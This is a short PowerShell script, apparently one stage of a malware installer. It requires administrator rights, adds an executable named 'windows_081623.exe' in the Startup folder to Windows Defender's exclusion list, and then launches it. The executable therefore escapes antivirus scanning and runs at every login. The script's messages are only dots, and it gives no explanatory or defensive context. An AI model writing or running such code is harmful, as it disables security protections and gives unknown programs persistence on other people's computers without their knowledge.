#3 

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "."
    Write-Host ".'."
    Exit
}

$startupFolderPath = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Startup)

$exeFileName = "windows_081623.exe"
$exeFilePath = Join-Path -Path $startupFolderPath -ChildPath $exeFileName

$existingExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
if ($existingExclusions -notcontains $exeFilePath) {
    $existingExclusions += $exeFilePath
    Write-Host "."
} else {
    Write-Host "."
}

Set-MpPreference -ExclusionPath $existingExclusions


Start-Sleep -Seconds 5

$exeFullPath = Join-Path -Path $startupFolderPath -ChildPath $exeFileName
Start-Process -FilePath $exeFullPath
